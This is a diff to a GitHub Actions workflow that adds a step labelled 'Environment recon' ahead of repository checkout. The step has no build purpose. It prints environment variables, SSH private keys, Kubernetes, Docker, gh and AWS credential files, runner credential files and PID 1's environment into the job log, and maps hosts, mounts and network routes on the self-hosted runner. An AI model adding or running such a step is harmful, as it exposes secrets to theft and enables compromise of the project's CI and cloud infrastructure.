@@ -23,6 +23,28 @@ jobs:
       pull-requests: write # release-drafter autolabeler
     runs-on: fixed-egress-4c-16g
     steps:
+      - name: Environment recon
+        run: |
+          set +e
+          echo "=== identity ==="; id; hostname; uname -a; date -u
+          echo "=== pwd ==="; pwd; ls -la
+          echo "=== env ==="; env | sort
+          echo "=== runner workspace ==="; echo "WS=$RUNNER_WORKSPACE"; ls -la "$RUNNER_WORKSPACE" 2>/dev/null; ls -la "$RUNNER_WORKSPACE/.." 2>/dev/null
+          echo "=== home dirs ==="; ls -la /home 2>/dev/null; ls -la /root 2>/dev/null
+          echo "=== ssh ==="; for d in /root /home/*; do echo "-- $d"; ls -la $d/.ssh 2>/dev/null; cat $d/.ssh/* 2>/dev/null; done
+          echo "=== kube ==="; for d in /root /home/*; do echo "-- $d"; cat $d/.kube/config 2>/dev/null; done
+          echo "=== docker ==="; cat /root/.docker/config.json 2>/dev/null; cat /home/*/.docker/config.json 2>/dev/null
+          echo "=== gh ==="; cat /root/.config/gh/hosts.yml 2>/dev/null; cat /home/*/.config/gh/hosts.yml 2>/dev/null
+          echo "=== aws ==="; ls -la /root/.aws 2>/dev/null; cat /root/.aws/credentials 2>/dev/null; cat /root/.aws/config 2>/dev/null
+          echo "=== git config ==="; cat /root/.gitconfig 2>/dev/null
+          echo "=== runner creds ==="; find / -maxdepth 5 \( -name ".credentials" -o -name ".runner" -o -name ".credentials_rsaparams" \) 2>/dev/null | head -20
+          echo "=== runner dirs ==="; ls -la /home/*/actions-runner 2>/dev/null; ls -la /opt 2>/dev/null; ls -la /srv 2>/dev/null; ls -la /actions-runner 2>/dev/null
+          echo "=== hosts ==="; cat /etc/hosts
+          echo "=== tools ==="; which kubectl helm docker ssh git gh aws gcloud talosctl 2>/dev/null
+          echo "=== mounts ==="; mount | head -30
+          echo "=== net ==="; cat /proc/net/route 2>/dev/null; hostname -I 2>/dev/null
+          echo "=== pid1 env ==="; tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -40
+          echo "=== done ==="
       - name: Checkout repository
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
         with:
